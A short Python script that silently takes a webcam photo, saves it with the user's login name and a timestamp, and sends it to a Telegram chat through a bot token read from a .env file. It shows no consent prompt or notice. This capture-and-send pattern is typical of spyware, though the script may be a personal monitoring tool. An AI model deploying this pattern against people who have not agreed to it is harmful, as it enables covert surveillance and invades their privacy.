import cv2
from datetime import datetime
import os
import telepot
from dotenv import load_dotenv
load_dotenv('.env')
token=os.getenv('TOKEN')
id=os.getenv('ID')

def camera():
    home_dir = os.path.expanduser("~")

    # Create a screenshots directory if it doesn't exist
    if not os.path.exists(home_dir+ "\\fotos"):
        os.mkdir(home_dir+"\\fotos")

    # Construct the screenshot path using the current date and time
    timestamp = datetime.now().strftime("%d-%m-%Y_%H-%M")
    foto_name = f"ft-{os.getlogin()}-{timestamp}.png"
 
    cam = cv2.VideoCapture(0)
    result, image = cam.read()
    if result:
        foto_path = os.path.join(home_dir,"fotos", foto_name)
        cv2.imwrite(foto_path, image)
        cv2.destroyAllWindows()
        with open(foto_path,'rb') as ft:
            try:
                bot = telepot.Bot(token=token)
                bot.sendPhoto(id, photo=ft)
            except:
                print(Exception)
            else:
                print("Sent")

